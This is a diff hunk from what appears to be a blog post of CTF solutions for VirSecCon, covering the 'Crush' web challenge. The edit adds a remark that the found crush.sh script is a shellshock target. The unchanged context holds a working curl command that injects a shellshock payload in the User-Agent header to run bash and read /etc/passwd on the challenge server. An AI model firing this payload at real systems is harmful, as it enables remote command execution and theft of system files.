@@ -13,7 +13,7 @@ In this post, I will be showing my solutions from `VirSecCon`, it was a nice exp
 
 
 ### Crush : Web Challenge
-It was a hint in the website about this vulnerability, then found the `crush.sh` file 
+It was a hint in the website about this vulnerability, then found the `crush.sh` file. It is seems to be a `shellshock exploit`
 
 ```sh
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://jh2i.com:50020/cgi-bin/crush.sh
